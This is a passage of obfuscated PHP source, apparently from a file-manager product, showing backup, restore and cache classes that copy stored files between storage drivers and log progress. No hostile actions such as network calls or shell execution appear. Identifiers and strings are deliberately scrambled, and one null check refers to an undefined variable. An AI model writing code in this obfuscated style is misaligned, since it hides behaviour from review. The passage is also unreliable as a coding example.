Model($…ãÍá£±[591])->listData($ğÍè¬¼›[$…ãÍá£±[1637]]); if (!$¶üùÂ¸ª) { return !1; $á¥õøÕş = Model($…ãÍá£±[591])->listData(); $«ªÁÊş¥ = array_filter_by_field($á¥õøÕş, $…ãÍá£±[502], $…ãÍá£±[228]); return $«ªÁÊş¥; } $È“İÖ­Ï = array_field_key($¶üùÂ¸ª, array($…ãÍá£±[487], $…ãÍá£±[32], $…ãÍá£±[502], $…ãÍá£±[2199], $…ãÍá£±[2200])); $È“İÖ­Ï[$…ãÍá£±[2406]] = $ğÍè¬¼›; return $È“İÖ­Ï; } else { return array($…ãÍá£±[508] => 0, $…ãÍá£±[2184] => $ğÍè¬¼›[$…ãÍá£±[2341]], $…ãÍá£±[509] => $…ãÍá£±[12], $…ãÍá£±[2199] => $…ãÍá£±[2407]); } } } goto cÏÖä³Î„ß; dá—™…ÎË: class BackupFile { protected $bakVer = "\x6f\x6c\144"; public function __construct($Ó–ùá¡¯ = false) { $¶‚³å¨Í =& $_SERVER[œ—üé‹ê]; $this->bakVer = $Ó–ùá¡¯ ? $¶‚³å¨Í[921] : $¶‚³å¨Í[922]; } public function index() { $ì¥¶ÃÚ’ = Backup::get(); $±•Ñ = $ì¥¶ÃÚ’[$_SERVER[œ—üé‹ê][865]][$_SERVER[œ—üé‹ê][230]][$_SERVER[œ—üé‹ê][557]]; $ÒÆÄ…‚ = array($_SERVER[œ—üé‹ê][558] => array($_SERVER[œ—üé‹ê][923], $±•Ñ), $_SERVER[œ—üé‹ê][924] => array($_SERVER[œ—üé‹ê][406], $ì¥¶ÃÚ’[$_SERVER[œ—üé‹ê][861]])); $½÷úÔÙô = (int) Model($_SERVER[œ—üé‹ê][925])->where($ÒÆÄ…‚)->count($_SERVER[œ—üé‹ê][557]); $‰µ‰ÙÎ¡ = (int) Model($_SERVER[œ—üé‹ê][925])->where($ÒÆÄ…‚)->sum($_SERVER[œ—üé‹ê][79]); $ÛêÁ°öŒ = new TaskFileTransfer($_SERVER[œ—üé‹ê][926], $_SERVER[œ—üé‹ê][888], $½÷úÔÙô, LNG($_SERVER[œ—üé‹ê][896]) . $_SERVER[œ—üé‹ê][897] . LNG($_SERVER[œ—üé‹ê][927])); $ÛêÁ°öŒ->task[$_SERVER[œ—üé‹ê][873]] = $‰µ‰ÙÎ¡; $†¡î…Êë = array($_SERVER[œ—üé‹ê][928] => $½÷úÔÙô, $_SERVER[œ—üé‹ê][929] => $‰µ‰ÙÎ¡, $_SERVER[œ—üé‹ê][930] => time()); Backup::set($†¡î…Êë); $îÂíšÇø = !0; $óìí = $this->storeIds(); $òÅ”²¸ = 1; $¥¸ñù›º = 1000; $‹¶ÅÙö = $ŸÒ¤ğÆ  = 0; $ÂëÌùö» = array(); $ƒ¹¬ñÙ = $¯æÂ×ªğ = 0; do { $Ûœ…Åø = $_SERVER[œ—üé‹ê][931]; $Óóö¯¿Á = Model($_SERVER[œ—üé‹ê][925])->where($ÒÆÄ…‚)->field($Ûœ…Åø)->order($_SERVER[œ—üé‹ê][932])->selectPage($¥¸ñù›º, $òÅ”²¸); $—¢Ú Ë = !empty($Óóö¯¿Á[$_SERVER[œ—üé‹ê][446]]) ? $Óóö¯¿Á[$_SERVER[œ—üé‹ê][446]] : array(); foreach ($—¢Ú Ë as $»ÙÈ…Õ±) { if (!$this->_fileExist($»ÙÈ…Õ±, $ÂëÌùö», $óìí)) { Backup::log($_SERVER[œ—üé‹ê][933] . $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][557]] . $_SERVER[œ—üé‹ê][934] . $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][87]]); continue; } $ˆÂÉèû¬ = $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][87]]; $¶ïè ÉÓ = "\x7b\151\157\72{$ì¥¶ÃÚ’[$_SERVER[œ—üé‹ê][861]]}\x7d" . substr($ˆÂÉèû¬, strlen("\x7b\x69\157\x3a{$»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][935]]}\x7d")); if (IO::exist($¶ïè ÉÓ)) { $ÛêÁ°öŒ->updateFileEnd($»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][32]], $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][79]]); } else { $¶ïè ÉÓ = get_path_father($¶ïè ÉÓ); IO::mkdir($¶ïè ÉÓ); if (!IO::copy($ˆÂÉèû¬, $¶ïè ÉÓ, $_SERVER[œ—üé‹ê][936])) { Backup::log($_SERVER[œ—üé‹ê][937] . $ˆÂÉèû¬ . $_SERVER[œ—üé‹ê][918] . $¶ïè ÉÓ . $_SERVER[œ—üé‹ê][175]); $îÂíšÇø = !1; break; } } $±•Ñ = $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][557]]; $ŸÒ¤ğÆ  += 1; $‹¶ÅÙö += $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][79]]; $¯æÂ×ªğ += 1; $ƒ¹¬ñÙ += $»ÙÈ…Õ±[$_SERVER[œ—üé‹ê][79]]; if ($‹¶ÅÙö >= 1024 * 1024 * 100) { $†¡î…Êë = array($_SERVER[œ—üé‹ê][860] => $±•Ñ, $_SERVER[œ—üé‹ê][938] => $¯æÂ×ªğ, $_SERVER[œ—üé‹ê][939] => $ƒ¹¬ñÙ); Backup::set($†¡î…Êë); $‹¶ÅÙö = $ŸÒ¤ğÆ  = 0; } } $ğÖı¢‰ = count($—¢Ú Ë); $òÅ”²¸++; } while ($ğÖı¢‰ == $¥¸ñù›º); $ÛêÁ°öŒ->end(); $†¡î…Êë = array($_SERVER[œ—üé‹ê][940] => 1, $_SERVER[œ—üé‹ê][871] => time(), $_SERVER[œ—üé‹ê][887] => 1, $_SERVER[œ—üé‹ê][860] => $±•Ñ, $_SERVER[œ—üé‹ê][941] => time()); if ($ŸÒ¤ğÆ ) { $†¡î…Êë[$_SERVER[œ—üé‹ê][938]] = $¯æÂ×ªğ; $†¡î…Êë[$_SERVER[œ—üé‹ê][939]] = $ƒ¹¬ñÙ; } Backup::set($†¡î…Êë); return !0; } private function _fileExist($à–ÏŸŞ, &$¥Ø€ÏÇ¯, $€íÇÜƒø) { $ì´‹’Çø =& $_SERVER[œ—üé‹ê]; $¼¼‰úûÛ = $à–ÏŸŞ[$ì´‹’Çø[87]]; if (in_array($à–ÏŸŞ[$ì´‹’Çø[557]], $¥Ø€ÏÇ¯)) { return !1; } if (!in_array($à–ÏŸŞ[$ì´‹’Çø[935]], $€íÇÜƒø)) { return !1; } if (IO::exist($¼¼‰úûÛ)) { return !0; } $¨‚»Àé = get_path_father($¼¼‰úûÛ); if (IO::exist($¨‚»Àé)) { $¥Ø€ÏÇ¯[] = $à–ÏŸŞ[$ì´‹’Çø[557]]; return !1; } $î‰ûŸş = array($ì´‹’Çø[935] => $à–ÏŸŞ[$ì´‹’Çø[935]], $ì´‹’Çø[87] => array($ì´‹’Çø[473], "{$¨‚»Àé}\45")); $ß»êöãµ = Model($ì´‹’Çø[925])->where($î‰ûŸş)->field($ì´‹’Çø[558])->select(); $¥Ø€ÏÇ¯ = array_merge($¥Ø€ÏÇ¯, array_to_keyvalue($ß»êöãµ, $ì´‹’Çø[12], $ì´‹’Çø[557])); return !1; } private function _fileFilter($ÂåàÊ—÷) { $¤ÚÃ¿Î =& $_SERVER[œ—üé‹ê]; return; if (empty($ÂåàÊ—÷)) { return; } $Ë÷¿Á¥˜ = array($¤ÚÃ¿Î[557] => array($¤ÚÃ¿Î[7], array_unique($ÂåàÊ—÷))); $µ‰‚ªµ¸ = Model($¤ÚÃ¿Î[942])->where($Ë÷¿Á¥˜)->field($¤ÚÃ¿Î[191])->select(); foreach ($µ‰‚ªµ¸ as $ÑŠü§ĞË) { Model($¤ÚÃ¿Î[942])->remove($ÑŠü§ĞË[$¤ÚÃ¿Î[191]], !1); } } private function storeIds() { $ìÅøòõæ =& $_SERVER[œ—üé‹ê]; $ÏÇ„øÂ = Model($ìÅøòõæ[877])->listData(); $è‡À°† = array(); $àüÊõÑÅ = $GLOBALS[$ìÅøòõæ[6]][$ìÅøòõæ[92]][$ìÅøòõæ[943]]; foreach ($ÏÇ„øÂ as $ì £Ôªì) { $ÌÇ‡Êá¦ = strtolower($ì £Ôªì[$ìÅøòõæ[96]]); if (!isset($àüÊõÑÅ[$ÌÇ‡Êá¦])) { continue; } $¢™÷¼ŞŸ = $ìÅøòõæ[77] . (isset($àüÊõÑÅ[$ÌÇ‡Êá¦]) ? $àüÊõÑÅ[$ÌÇ‡Êá¦] : ucfirst($ÌÇ‡Êá¦)); if (!class_exists($¢™÷¼ŞŸ)) { continue; } $è‡À°†[] = $ì £Ôªì[$ìÅøòõæ[487]]; } return $è‡À°†; } public function start($¦ùƒçÁá, $´˜Ú¬£Ï) { $¼¯ºûÇ =& $_SERVER[œ—üé‹ê]; $¨ô‘Æª = KodIO::makePath(KodIO::KOD_IO, $¦ùƒçÁá); if (!$this->checkStore($¦ùƒçÁá)) { write_log($¼¯ºûÇ[944] . $¨ô‘Æª, $¼¯ºûÇ[945]); return; } $­İµ¦ú¶ = KodIO::defaultDriver(); if ($­İµ¦ú¶[$¼¯ºûÇ[487]] == $¦ùƒçÁá) { write_log($¼¯ºûÇ[946] . $¨ô‘Æª, $¼¯ºûÇ[945]); return; } $óº¿Üã = $¼¯ºûÇ[947]; $¿ˆ°’ÁÏ = Task::get($óº¿Üã); if ($¿ˆ°’ÁÏ) { if ($¿ˆ°’ÁÏ[$¼¯ºûÇ[859]] == $¼¯ºûÇ[948]) { return; } Task::kill($óº¿Üã); } $ø—¾§ª¯ = array($¼¯ºûÇ[861] => $¦ùƒçÁá, $¼¯ºûÇ[557] => 0, $¼¯ºûÇ[204] => 0, $¼¯ºûÇ[865] => array($¼¯ºûÇ[868] => 0, $¼¯ºûÇ[949] => 0, $¼¯ºûÇ[873] => 0, $¼¯ºûÇ[950] => 0, $¼¯ºûÇ[951] => 0)); $ŠÖäÆ¹¸ = Model($¼¯ºûÇ[882])->get($¼¯ºûÇ[952], $¼¯ºûÇ[888]); $ŠÖäÆ¹¸ = json_decode($ŠÖäÆ¹¸, !0); if (!$ŠÖäÆ¹¸) { $ŠÖäÆ¹¸ = array(); } if ($ŠÖäÆ¹¸[$¼¯ºûÇ[861]] && $ŠÖäÆ¹¸[$¼¯ºûÇ[861]] != $¦ùƒçÁá) { $ŠÖäÆ¹¸[$¼¯ºûÇ[557]] = 0; $ŠÖäÆ¹¸[$¼¯ºûÇ[861]] = $¦ùƒçÁá; } $ŠÖäÆ¹¸ = array_merge($ø—¾§ª¯, $ŠÖäÆ¹¸); $À«éœÊ™ = _get($GLOBALS, $¼¯ºûÇ[7], array()); if ($À«éœÊ™[$¼¯ºûÇ[864]] == $¼¯ºûÇ[91] && $À«éœÊ™[$¼¯ºûÇ[953]] == $¼¯ºûÇ[91]) { $ŠÖäÆ¹¸ = $ø—¾§ª¯; } $¨ô‘Æª = KodIO::makePath(KodIO::KOD_IO, $ŠÖäÆ¹¸[$¼¯ºûÇ[861]]); $ÛÌ¥–¼Ô = $¨ô‘Æª . $¼¯ºûÇ[954]; if (!file_exists($ÛÌ¥–¼Ô)) { $ÇëØô«½ = file_get_contents(__DIR__ . $¼¯ºûÇ[955]); if (defined($¼¯ºûÇ[956]) && INSTALL_CHANNEL) { $ÇëØô«½ = str_replace($¼¯ºûÇ[957], INSTALL_CHANNEL, $ÇëØô«½); } file_put_contents($ÛÌ¥–¼Ô, $ÇëØô«½); } $ø±Îˆƒá = $´˜Ú¬£Ï * 60 * 0.8; $±è·Ã• = timeFloat(); $Öûåí–¡ = Model($¼¯ºûÇ[560]); $é¨€‰Õ = array($¼¯ºûÇ[558] => array($¼¯ºûÇ[923], $ŠÖäÆ¹¸[$¼¯ºûÇ[557]])); $½Ä¹ÊÛ‹ = $Öûåí–¡->field(array($¼¯ºûÇ[958] => $¼¯ºûÇ[959], $¼¯ºûÇ[960] => $¼¯ºûÇ[79]))->where($é¨€‰Õ)->find(); if (!$½Ä¹ÊÛ‹[$¼¯ºûÇ[959]]) { return; } $ì¨´ö¤ = intval($½Ä¹ÊÛ‹[$¼¯ºûÇ[959]]); $ıê’ÅÄ¯ = intval($½Ä¹ÊÛ‹[$¼¯ºûÇ[79]]); $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[868]] += $ì¨´ö¤; $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[873]] += $ıê’ÅÄ¯; $ŠÖäÆ¹¸[$¼¯ºûÇ[204]] = time(); Model($¼¯ºûÇ[882])->set($¼¯ºûÇ[952], $ŠÖäÆ¹¸, $¼¯ºûÇ[888]); $¿ˆ°’ÁÏ = new TaskFileTransfer($óº¿Üã, $¼¯ºûÇ[888], 0, LNG($¼¯ºûÇ[896]) . $¼¯ºûÇ[897] . LNG($¼¯ºûÇ[927])); $Æ…ü²ÏÑ = 500; $ò¦²óıº = 1; $‘‚öîü = $¼¯ºûÇ[931]; $§û¼ä±À = $Öûåí–¡->where($é¨€‰Õ)->field($‘‚öîü)->order($¼¯ºûÇ[932])->selectPage($Æ…ü²ÏÑ, $ò¦²óıº); $¿ˆ°’ÁÏ->task[$¼¯ºûÇ[961]] = intval($§û¼ä±À[$¼¯ºûÇ[443]][$¼¯ºûÇ[444]]); $¼´Øö¼ = array($¼¯ºûÇ[868] => 0, $¼¯ºûÇ[962] => 0, $¼¯ºûÇ[951] => 0, $¼¯ºûÇ[963] => $ŠÖäÆ¹¸[$¼¯ºûÇ[557]], $¼¯ºûÇ[964] => 0); $ÛšÍîÄ« = intval($§û¼ä±À[$¼¯ºûÇ[443]][$¼¯ºûÇ[445]]); while ($§û¼ä±À && $ò¦²óıº <= $ÛšÍîÄ«) { foreach ($§û¼ä±À[$¼¯ºûÇ[446]] as $º„äë¦) { if (timeFloat() - $±è·Ã• > $ø±Îˆƒá) { break; } $¼´Øö¼[$¼¯ºûÇ[868]]++; $ŠÖäÆ¹¸[$¼¯ºûÇ[557]] = $º„äë¦[$¼¯ºûÇ[557]]; $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[949]]++; $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[950]] += $º„äë¦[$¼¯ºûÇ[79]]; $şä¤ò…© = $º„äë¦[$¼¯ºûÇ[87]]; if (!$this->isFileExist($º„äë¦, $Öûåí–¡)) { $¿ˆ°’ÁÏ->updateFileEnd($º„äë¦[$¼¯ºûÇ[32]], $º„äë¦[$¼¯ºûÇ[79]]); $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[951]]++; $¼´Øö¼[$¼¯ºûÇ[962]]++; write_log($¼¯ºûÇ[933] . $º„äë¦[$¼¯ºûÇ[557]] . $¼¯ºûÇ[934] . $şä¤ò…©, $¼¯ºûÇ[945]); continue; } $‡ ò˜½Û = $¨ô‘Æª . substr($şä¤ò…©, strlen("\173\x69\157\72{$º„äë¦[$¼¯ºûÇ[935]]}\175\57")); if (IO::exist($‡ ò˜½Û)) { $¿ˆ°’ÁÏ->updateFileEnd($º„äë¦[$¼¯ºûÇ[32]], $º„äë¦[$¼¯ºûÇ[79]]); continue; } $‡ ò˜½Û = get_path_father($‡ ò˜½Û); if (!IO::copy($şä¤ò…©, $‡ ò˜½Û, REPEAT_SKIP)) { $ŠÖäÆ¹¸[$¼¯ºûÇ[865]][$¼¯ºûÇ[951]]++; $¼´Øö¼[$¼¯ºûÇ[951]]++; write_log($¼¯ºûÇ[965] . $º„äë¦[$¼¯ºûÇ[557]] . $¼¯ºûÇ[934] . $şä¤ò…©, $¼¯ºûÇ[945]); } $¿ˆ°’ÁÏ->updateFileEnd($º„äë¦[$¼¯ºûÇ[32]], $º„äë¦[$¼¯ºûÇ[79]]); } $ò¦²óıº++; $§û¼ä±À = $Öûåí–¡->where($é¨€‰Õ)->field($‘‚öîü)->order($¼¯ºûÇ[932])->selectPage($Æ…ü²ÏÑ, $ò¦²óıº); } $¿ˆ°’ÁÏ->end(); write_log($¼¯ºûÇ[966] . json_encode($¼´Øö¼), $¼¯ºûÇ[945]); if (IO::mkdir($¨ô‘Æª . $¼¯ºûÇ[967])) { $¼´Øö¼[$¼¯ºûÇ[964]] = $ŠÖäÆ¹¸[$¼¯ºûÇ[557]]; IO::setContent($¨ô‘Æª . $¼¯ºûÇ[968] . date($¼¯ºûÇ[969]) . $¼¯ºûÇ[970], json_encode($¼´Øö¼)); } Model($¼¯ºûÇ[882])->set($¼¯ºûÇ[952], $ŠÖäÆ¹¸, $¼¯ºûÇ[888]); return !0; } private function isFileExist($¹«·ÑÔ˜, $©Á·§†) { $Ô§©£ =& $_SERVER[œ—üé‹ê]; static $¤ÜËø½¿ = null; static $›™†èº² = null; if (is_null($¤ÜËø½¿)) { $¤ÜËø½¿ = $›™†èº² = array(); } $Š¢õµÔ = $¹«·ÑÔ˜[$Ô§©£[935]]; if (!isset($¤ÜËø½¿[$Š¢õµÔ])) { $¤ÜËø½¿[$Š¢õµÔ] = $this->checkStore($Š¢õµÔ); } if ($¤ÜËø½¿[$Š¢õµÔ] !== 1) { return !1; } if (in_array($¹«·ÑÔ˜[$Ô§©£[557]], $›™†èº²)) { return !1; } $§û“¡ŠÑ = $¹«·ÑÔ˜[$Ô§©£[87]]; if (IO::exist($§û“¡ŠÑ)) { return !0; } $¦ÈŞä¼– = get_path_father($§û“¡ŠÑ); if (IO::exist($¦ÈŞä¼–)) { $›™†èº²[] = $¹«·ÑÔ˜[$Ô§©£[557]]; return !1; } $¢½İªË÷ = array($Ô§©£[935] => $Š¢õµÔ, $Ô§©£[87] => array($Ô§©£[473], "{$¦ÈŞä¼–}\x25")); $½èí™ÙÈ = $©Á·§†->where($¢½İªË÷)->field($Ô§©£[558])->select(); $›™†èº² = array_merge($›™†èº², array_to_keyvalue($½èí™ÙÈ, $Ô§©£[12], $Ô§©£[557])); return !1; } public function checkStore($®€ï’ƒ) { static $‚ô¬²„Ã; if (is_null($‚ô¬²„Ã)) { $‚ô¬²„Ã = Model($_SERVER[œ—üé‹ê][877]); } $»ÉİÇÊè = $‚ô¬²„Ã->listData($®€ï’ƒ); if (!$»ÉİÇÊè) { return 0; } try { $÷ÄÑŒ×ú = $‚ô¬²„Ã->checkConfig($»ÉİÇÊè, !0); } catch (Exception $ï®êŒÆ¤) { $÷ÄÑŒ×ú = !1; } return $÷ÄÑŒ×ú === !0 ? 1 : 0; } } class RestoreFile { public $message; public function __construct() { } public function start($ş•Å¦Åæ) { $¹ôí÷…Ò =& $_SERVER[œ—üé‹ê]; $İ„¥í‡ = Model($¹ôí÷…Ò[882]); if ($İ„¥í‡->get($¹ôí÷…Ò[971]) == $¹ôí÷…Ò[972]) { $this->message = LNG($¹ôí÷…Ò[973]); return !1; } $ş•Å¦Åæ = rtrim($ş•Å¦Åæ, $¹ôí÷…Ò[8]) . $¹ôí÷…Ò[8]; $°‘Ãšüâ = IO::listPath($ş•Å¦Åæ); if (empty($°‘Ãšüâ[$¹ôí÷…Ò[85]]) && empty($°‘Ãšüâ[$¹ôí÷…Ò[86]])) { show_json(LNG($¹ôí÷…Ò[974]), !1); } $ºÚÒ«ú• = $¹ôí÷…Ò[975]; $öôØºôô = Task::get($ºÚÒ«ú•); if ($öôØºôô) { if ($öôØºôô[$¹ôí÷…Ò[859]] == $¹ôí÷…Ò[948]) { $this->message = LNG($¹ôí÷…Ò[976]); return !0; } Task::kill($ºÚÒ«ú•); } $ğºêâú¶ = array($¹ôí÷…Ò[87] => $ş•Å¦Åæ, $¹ôí÷…Ò[557] => 0, $¹ôí÷…Ò[204] => 0, $¹ôí÷…Ò[865] => array($¹ôí÷…Ò[868] => 0, $¹ôí÷…Ò[949] => 0, $¹ôí÷…Ò[873] => 0, $¹ôí÷…Ò[950] => 0, $¹ôí÷…Ò[951] => 0), $¹ôí÷…Ò[977] => array($¹ôí÷…Ò[868] => 0, $¹ôí÷…Ò[949] => 0, $¹ôí÷…Ò[951] => 0)); $ñÍ¯ş´³ = $İ„¥í‡->get($¹ôí÷…Ò[952], $¹ôí÷…Ò[978]); $ñÍ¯ş´³ = json_decode($ñÍ¯ş´³, !0); if (!$ñÍ¯ş´³) { $ñÍ¯ş´³ = array(); } $ñÍ¯ş´³ = array_merge($ğºêâú¶, $ñÍ¯ş´³); if (_get($GLOBALS, $¹ôí÷…Ò[979], 0) == $¹ôí÷…Ò[91]) { $ñÍ¯ş´³ = $ğºêâú¶; } $ÇÈÀ¤šŸ = Model($¹ôí÷…Ò[560]); $ĞÁ·„Íï = array($¹ôí÷…Ò[558] => array($¹ôí÷…Ò[923], $ñÍ¯ş´³[$¹ôí÷…Ò[557]])); $àØĞê†… = $ÇÈÀ¤šŸ->field(array($¹ôí÷…Ò[958] => $¹ôí÷…Ò[959], $¹ôí÷…Ò[960] => $¹ôí÷…Ò[79]))->where($ĞÁ·„Íï)->find(); if (!intval($àØĞê†…[$¹ôí÷…Ò[959]])) { $this->message = LNG($¹ôí÷…Ò[980]); return !0; } $…İ¹íÚ¬ = intval($àØĞê†…[$¹ôí÷…Ò[959]]); $—ï ¶ºÖ = intval($àØĞê†…[$¹ôí÷…Ò[79]]); $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[868]] += $…İ¹íÚ¬; $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[873]] += $—ï ¶ºÖ; $ñÍ¯ş´³[$¹ôí÷…Ò[977]][$¹ôí÷…Ò[868]] = $…İ¹íÚ¬; $ñÍ¯ş´³[$¹ôí÷…Ò[204]] = time(); $İ„¥í‡->set($¹ôí÷…Ò[952], $ñÍ¯ş´³, $¹ôí÷…Ò[978]); $‡Ó»İ© = KodIO::defaultDriver(); $ìÓ³ƒ©¡ = $‡Ó»İ©[$¹ôí÷…Ò[487]]; $îá¥µ¯„ = KodIO::makePath(KodIO::KOD_IO, $ìÓ³ƒ©¡); $öôØºôô = new TaskFileTransfer($ºÚÒ«ú•, $¹ôí÷…Ò[978], 0, LNG($¹ôí÷…Ò[981]) . $¹ôí÷…Ò[897] . LNG($¹ôí÷…Ò[927])); $¾‚ğ‹¼ß = 1000; $óã‹×÷¤ = 1; $Û¦×šğ¸ = $¹ôí÷…Ò[931]; $°‘Ãšüâ = $ÇÈÀ¤šŸ->where($ĞÁ·„Íï)->field($Û¦×šğ¸)->order($¹ôí÷…Ò[932])->selectPage($¾‚ğ‹¼ß, $óã‹×÷¤); $öôØºôô->task[$¹ôí÷…Ò[961]] = intval($°‘Ãšüâ[$¹ôí÷…Ò[443]][$¹ôí÷…Ò[444]]); $áŞëé = intval($°‘Ãšüâ[$¹ôí÷…Ò[443]][$¹ôí÷…Ò[445]]); while ($°‘Ãšüâ && $óã‹×÷¤ <= $áŞëé) { foreach ($°‘Ãšüâ[$¹ôí÷…Ò[446]] as $ËÖÂş“Ó) { $ñÍ¯ş´³[$¹ôí÷…Ò[557]] = $ËÖÂş“Ó[$¹ôí÷…Ò[557]]; $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[949]]++; $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[950]] += $ËÖÂş“Ó[$¹ôí÷…Ò[79]]; $ñÍ¯ş´³[$¹ôí÷…Ò[977]][$¹ôí÷…Ò[949]]++; $…Ûšù¼ = $ËÖÂş“Ó[$¹ôí÷…Ò[87]]; if (IO::exist($…Ûšù¼)) { $öôØºôô->update(1); continue; } $ŒòôÀú» = substr($…Ûšù¼, strlen("\173\x69\x6f\x3a{$ËÖÂş“Ó[$¹ôí÷…Ò[935]]}\175\x2f")); $ˆÓ»ÌÁ€ = $îá¥µ¯„ . $ŒòôÀú»; if ($ìÓ³ƒ©¡ != $ËÖÂş“Ó[$¹ôí÷…Ò[935]] && IO::exist($ˆÓ»ÌÁ€)) { $öôØºôô->update(1); $this->updateFile($ËÖÂş“Ó[$¹ôí÷…Ò[557]], $ìÓ³ƒ©¡, $ˆÓ»ÌÁ€, $ÇÈÀ¤šŸ); continue; } $èŒ×çâİ = $ş•Å¦Åæ . $ŒòôÀú»; if (!$this->isFileExist($èŒ×çâİ)) { $öôØºôô->update(1); $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[951]]++; $ñÍ¯ş´³[$¹ôí÷…Ò[977]][$¹ôí÷…Ò[951]]++; write_log($¹ôí÷…Ò[982] . $èŒ×çâİ, $¹ôí÷…Ò[983]); continue; } if (!IO::copy($èŒ×çâİ, $îá¥µ¯„, REPEAT_SKIP)) { $ñÍ¯ş´³[$¹ôí÷…Ò[865]][$¹ôí÷…Ò[951]]++; $ñÍ¯ş´³[$¹ôí÷…Ò[977]][$¹ôí÷…Ò[951]]++; write_log($¹ôí÷…Ò[984] . $èŒ×çâİ . $¹ôí÷…Ò[985] . $ËÖÂş“Ó[$¹ôí÷…Ò[557]], $¹ôí÷…Ò[983]); } else { $this->updateFile($ËÖÂş“Ó[$¹ôí÷…Ò[557]], $ìÓ³ƒ©¡, $ˆÓ»ÌÁ€, $ÇÈÀ¤šŸ); } $öôØºôô->update(1); } $İ„¥í‡->set($¹ôí÷…Ò[952], $ñÍ¯ş´³, $¹ôí÷…Ò[978]); $óã‹×÷¤++; $°‘Ãšüâ = $ÇÈÀ¤šŸ->where($ĞÁ·„Íï)->field($Û¦×šğ¸)->order($¹ôí÷…Ò[932])->selectPage($¾‚ğ‹¼ß, $óã‹×÷¤); } $öôØºôô->end(); $İ„¥í‡->set($¹ôí÷…Ò[952], $ñÍ¯ş´³, $¹ôí÷…Ò[978]); $°‘Ãšüâ = Model($¹ôí÷…Ò[877])->listData(); $‹äœÕ¸Ş = array_to_keyvalue($°‘Ãšüâ, $¹ôí÷…Ò[12], $¹ôí÷…Ò[487]); $àÃªË¼© = md5($¹ôí÷…Ò[986] . implode($¹ôí÷…Ò[50], $‹äœÕ¸Ş)); Cache::remove($àÃªË¼©); return !0; } private function isFileExist($ñ‘Ê•³ı) { static $™²³”Ø = null; if (is_null($º…ÛôÀ•)) { $™²³”Ø = array(); } $”Ğß„™’ = get_path_father($ñ‘Ê•³ı); if (in_array($”Ğß„™’, $™²³”Ø)) { return !1; } if (!IO::exist($”Ğß„™’)) { $™²³”Ø[] = $”Ğß„™’; return !1; } return IO::exist($ñ‘Ê•³ı); } private function updateFileBatch($«£Î«îœ, &$ãòª§şƒ, $À±ÆßŠ) { $Ô¦ÙéşÆ =& $_SERVER[œ—üé‹ê]; Model($Ô¦ÙéşÆ[882])->set($Ô¦ÙéşÆ[952], $«£Î«îœ, $Ô¦ÙéşÆ[978]); if (!$ãòª§şƒ) { return; } $ÏÓÍ‰¶Š = Model($Ô¦ÙéşÆ[560]); foreach ($ãòª§şƒ as $Ø¼çèË˜ => $Ö›«ç×) { $£Û¦­˜Ø = array($Ô¦ÙéşÆ[935] => $À±ÆßŠ, $Ô¦ÙéşÆ[87] => $Ö›«ç×); $ÏÓÍ‰¶Š->where(array($Ô¦ÙéşÆ[557] => $Ø¼çèË˜))->save($£Û¦­˜Ø); } } private function updateFile($ÔØ¶Ãëı, $„¥­‡Äé, $ÂŠÊÎ, $ĞÌùÈ´) { $İ²Â¹— =& $_SERVER[œ—üé‹ê]; $˜“ü²œ¥ = array($İ²Â¹—[935] => $„¥­‡Äé, $İ²Â¹—[87] => $ÂŠÊÎ); $£šß°ùö = $ĞÌùÈ´->where(array($İ²Â¹—[557] => $ÔØ¶Ãëı))->save($˜“ü²œ¥); if ($£šß°ùö) { return; } write_log($İ²Â¹—[987] . $ÔØ¶Ãëı, $İ²Â¹—[983]); } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $ÉœßáËó =& $_SERVER[œ—üé‹ê]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $ÁòÍ‡ = $GLOBALS[$ÉœßáËó[6]][$ÉœßáËó[424]]; $ğÚÁåëŸ = $ÁòÍ‡[$ÁòÍ‡[$ÉœßáËó[988]]]; $÷‰Ç£Îø = $ÁòÍ‡[$ÉœßáËó[989]]; switch ($ÁòÍ‡[$ÉœßáËó[988]]) { case $ÉœßáËó[21]: self::$handle = Model($ÉœßáËó[990]); break; case $ÉœßáËó[991]: self::$handle = new CacheRedis($ğÚÁåëŸ, $÷‰Ç£Îø); break; case $ÉœßáËó[992]: self::$handle = new CacheMemcached($ğÚÁåëŸ, $÷‰Ç£Îø); break; case $ÉœßáËó[230]: self::$handle = new CacheFile($ğÚÁåëŸ, $÷‰Ç£Îø); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ØÍ”ùÀÏ) { if (is_array($ØÍ”ùÀÏ) || is_object($ØÍ”ùÀÏ)) { $ØÍ”ùÀÏ = json_encode($ØÍ”ùÀÏ); } $ØÍ”ùÀÏ = rawurlencode($ØÍ”ùÀÏ); return md5(KOD_SITE_ID . $_SERVER[œ—üé‹ê][11] . $ØÍ”ùÀÏ); } public static function get($¿èëåÃÓ, $ñœì°°ó = false) { $ñ™«È¾† = self::key($¿èëåÃÓ); $ÄÔ•»© = self::init(); if ($ñœì°°ó) { return unserialize($ÄÔ•»©->get($ñ™«È¾†)); } if (!isset(self::$memoryCache[$ñ™«È¾†])) { $øÖş• = $ÄÔ•»©->get($ñ™«È¾†); self::$memoryCache[$ñ™«È¾†] = unserialize($øÖş•); } return self::$memoryCache[$ñ™«È¾†]; } public static function set($öà……½ö, $ù‚™ò›, $„À¢¿ş = false) { $ŸîÖ§ =& $_SERVER[œ—üé‹ê]; $‚‰–‚£¥ = 